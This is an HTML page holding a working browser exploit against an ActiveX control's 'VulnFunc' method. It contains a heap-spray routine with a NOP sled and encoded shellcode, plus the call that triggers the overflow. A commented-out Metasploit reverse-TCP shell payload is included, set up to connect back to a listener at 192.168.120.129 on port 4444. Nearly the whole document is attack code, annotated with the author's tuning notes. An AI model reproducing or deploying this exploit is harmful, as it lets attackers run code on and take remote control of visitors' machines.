<html>
<object classid='clsid:3D5A15F5-DAB1-4132-97C0-9FEBCDB473D6' id='target'></object>
<script language='javascript'>  

                                       
   //blind_jmp = unescape("%u1111");   //This is where to go
   //blind_jmp = unescape("%u2121");   //also worked with i<28
   blind_jmp = unescape("%u2424"); //2424 is perfect.  safe NOP + I can get it in the seld of the .net uc, and being 2 bytes, now dword alignment issues. 
   while( blind_jmp.length < 40000 )
	blind_jmp += blind_jmp;

   //quick and dirty -- with hardcoded function address
   shellcode = unescape("%u4241%u4190%u3142%ub9c0%u07ea%u7e45%u08e8%u0000%u5000%u6e77%u6761%u2165%u5b00%u5350%u5053%ud1ff%ufab9%u81ca%u507c%ud1ff");

   // windows/shell_reverse_tcp - 287 bytes
   //http://www.metasploit.com
   //LHOST=192.168.120.129, EXITFUNC=seh, LPORT=4444
   //shellcode = unescape("%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9%uadf5%uff57%u53d6%u5353%u4353%u4353%uff53%u68d0%ua8c0%u8178%u6866%u5c11%u5366%ue189%u6895%uf9ec%u60aa%uff57%u6ad6%u5110%uff55%u66d0%u646a%u6866%u6d63%u506a%u2959%u89cc%u6ae7%u8944%u31e2%uf3c0%u95aa%ufd89%u42fe%ufe2d%u2c42%u7a8d%uab38%uabab%u7268%ub3fe%uff16%u2875%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce%ud6ff%uff6a%u37ff%ud0ff%ue768%uc679%uff79%u0475%ud6ff%u77ff%ufffc%u68d0%u8af0%u5f04%uff53%uffd6%u41d0");

   //nops = unescape("%u1111");  //this is NOP, but depends on ecx being a valid ptr
   nops = blind_jmp; //less calculation if using same val, plus if a func ptr were to be clobbered on heap we'd still go to same spot, nice. :)
   while( nops.length < 5000000 )
	nops += nops;
   
   mem = new Array();  //This where the heapspray comes into play
   for(i=0; i<33; i++)   //i<14 worked well for 11111111, but changed for .net compatibilty testing
	mem.push(nops+shellcode);

   target.VulnFunc(blind_jmp); //overflow occurs here

</script></html>

